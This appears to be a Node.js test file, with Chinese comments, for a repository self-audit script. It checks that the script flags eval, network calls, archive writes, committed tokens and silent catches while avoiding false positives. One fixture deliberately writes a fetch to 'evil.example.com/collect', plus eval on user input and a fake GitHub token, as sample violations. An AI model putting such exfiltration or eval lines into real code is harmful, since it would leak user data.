// SPDX-License-Identifier: MIT
// Copyright (c) 2026 fish-memory-plugin authors

/**
 * audit-self.mjs 的测试。
 *
 * 重点不是"能抓到坏东西"，而是钉住三个**踩过的坑**：
 *   ① 注释里举例的 `ctx.on(...)` 不算越界（Windows CRLF 下 `//.*$` 匹配不到，曾误报）
 *   ② PowerShell 写出的带 BOM 的 package.json 仍能被读（曾被静默 catch 吞掉，"破零依赖"漏报）
 *   ③ 干净仓库必须 0 报错（检测器一味报警等于没有检测器）
 */

import { test } from 'node:test'
import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'

const pkgRoot = join(dirname(fileURLToPath(import.meta.url)), '..')
const SCRIPT = join(pkgRoot, 'scripts/audit-self.mjs')

function repo(files) {
  const dir = mkdtempSync(join(tmpdir(), 'audit-'))
  for (const [rel, content] of Object.entries(files)) {
    const p = join(dir, rel)
    mkdirSync(dirname(p), { recursive: true })
    writeFileSync(p, content, 'utf8')
  }
  return dir
}

function run(dir, extra = []) {
  const r = spawnSync(process.execPath, [SCRIPT, '--dir', dir, '--json', ...extra], { encoding: 'utf8' })
  const json = r.stdout ? JSON.parse(r.stdout) : null
  return { code: r.status, json, out: r.stdout, err: r.stderr }
}

const rulesOf = (json, sev) => json.findings.filter((f) => f.severity === sev).map((f) => f.rule)

test('干净仓库：0 报错（检测器不能自己制造噪音）', () => {
  const dir = repo({
    'package.json': JSON.stringify({ name: 'x', license: 'MIT' }),
    'lib/ok.js': "export const add = (a, b) => a + b\n",
    'docs/note.md': '这里写文档，提到 `C:\\Users\\<用户名>` 这种占位符没问题\n',
  })
  const { code, json } = run(dir)
  assert.equal(json.counts.error, 0, JSON.stringify(json.findings, null, 2))
  assert.equal(json.counts.warn, 0)
  assert.equal(code, 0)
})

test('注释里举例的 ctx./eval 不算越界（CRLF 也不许误报）', () => {
  const dir = repo({
    'package.json': JSON.stringify({ name: 'x', license: 'MIT' }),
    // 故意用 CRLF：Windows 下按 \n 切行会留下 \r，`//.*$` 曾因此匹配不到
    'lib/ok.js': ['// 举例：ctx.on(...) 这样写才对', '// eval(x) 是禁止的', 'export const f = () => 1', ''].join('\r\n'),
  })
  const { json } = run(dir)
  assert.deepEqual(rulesOf(json, 'error'), [], JSON.stringify(json.findings, null, 2))
})

test('真问题：ctx 越界 / eval / 网络 / 写真相层 / 真密钥，一起抓出来', () => {
  const dir = repo({
    'package.json': JSON.stringify({ name: 'x', license: 'MIT' }),
    'lib/bad.js': [
      "ctx.on('x', () => {})",
      'const out = eval(userInput)',
      "await fetch('https://evil.example.com/collect')",
      "writeFileSync('10_archive/messages/x.jsonl', 'hack')",
      'const token = "ghp_A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8"',
    ].join('\n'),
  })
  const { code, json } = run(dir)
  const errs = rulesOf(json, 'error')
  for (const r of ['ctx-outside-host', 'dynamic-code', 'network-in-lib', 'archive-write', 'secret-in-repo']) {
    assert.ok(errs.includes(r), `漏报 ${r}：${JSON.stringify(errs)}`)
  }
  assert.equal(code, 1)
})

test('带 BOM 的 package.json + 有依赖：必须报 zero-dependency（曾被静默吞掉）', () => {
  const dir = repo({
    // 模拟 PowerShell 5.1 的 Set-Content -Encoding UTF8：BOM 开头
    'package.json': '\uFEFF' + JSON.stringify({ name: 'x', license: 'MIT', dependencies: { lodash: '^4' } }),
    'lib/ok.js': 'export const f = () => 1\n',
  })
  const { json } = run(dir)
  const errs = rulesOf(json, 'error')
  assert.ok(errs.includes('zero-dependency'), `应报零依赖被破坏：${JSON.stringify(errs)}`)
})

test('占位符不算密钥（github_pat_xxx / <你的token>）', () => {
  const dir = repo({
    'package.json': JSON.stringify({ name: 'x', license: 'MIT' }),
    'scripts/upload.mjs': [
      '// $env:GH_TOKEN = "github_pat_xxx"',
      "die('先设 $env:GH_TOKEN = \"github_pat_xxx\"')",
      'const t = "<你的token>"',
    ].join('\n'),
  })
  const { json } = run(dir)
  assert.deepEqual(rulesOf(json, 'error'), [], JSON.stringify(json.findings, null, 2))
})

test('--json 结构稳定（有下游会读它）', () => {
  const dir = repo({ 'package.json': JSON.stringify({ name: 'x', license: 'MIT' }) })
  const { json } = run(dir)
  assert.equal(typeof json.target, 'string')
  assert.equal(typeof json.scannedFiles, 'number')
  assert.deepEqual(Object.keys(json.counts).sort(), ['error', 'info', 'warn'])
  assert.ok(Array.isArray(json.findings))
})

test('实际仓库：本仓库自己必须干净（否则 CI 会红）', () => {
  const { code, json } = run(pkgRoot)
  assert.equal(json.counts.error, 0, JSON.stringify(json.findings.filter((f) => f.severity === 'error'), null, 2))
  assert.equal(code, 0)
})

test('静默 catch：光秃秃的 ignore 要报，写了理由的不报（单行/多行都要覆盖）', () => {
  const dir = repo({
    'package.json': JSON.stringify({ name: 'x', license: 'MIT' }),
    'lib/bare-single.js': 'try { a() } catch { /* ignore */ }\n',
    'lib/bare-multi.js': 'try {\n  b()\n} catch (e) {\n  // ignore\n}\n',
    'lib/explained-single.js': 'try { c() } catch { /* ignore: 清理失败不影响结果 */ }\n',
    'lib/explained-multi.js': 'try {\n  d()\n} catch (e) {\n  // ignore: 探不到就当没有\n}\n',
  })
  const { json } = run(dir)
  const files = json.findings.filter((f) => f.rule === 'silent-catch').map((f) => f.file).sort()
  assert.deepEqual(files, ['lib/bare-multi.js', 'lib/bare-single.js'], `只该报两条裸 ignore：${JSON.stringify(files)}`)
})

test('span 窗口不该把同一条报多次（曾一次 catch 报 6 次）', () => {
  const dir = repo({
    'package.json': JSON.stringify({ name: 'x', license: 'MIT' }),
    'lib/one.js': 'try {\n  a()\n} catch {\n  /* ignore */\n}\n',
  })
  const { json } = run(dir)
  const f = json.findings.find((x) => x.rule === 'silent-catch')
  assert.ok(f, '应当报出来')
  assert.equal(f.count, 1, `同一条 catch 只能算一次，实际 ${f.count}`)
})

test('TODO 写在注释里也要统计（曾因先剥注释而恒为 0）', () => {
  const dir = repo({
    'package.json': JSON.stringify({ name: 'x', license: 'MIT' }),
    'lib/todo.js': '// TODO: 收口这个分支\n// FIXME: 另说\n',
  })
  const { json } = run(dir)
  const f = json.findings.find((x) => x.rule === 'todo-left')
  assert.ok(f, '注释里的 TODO 应当被统计')
  assert.equal(f.count, 2)
})
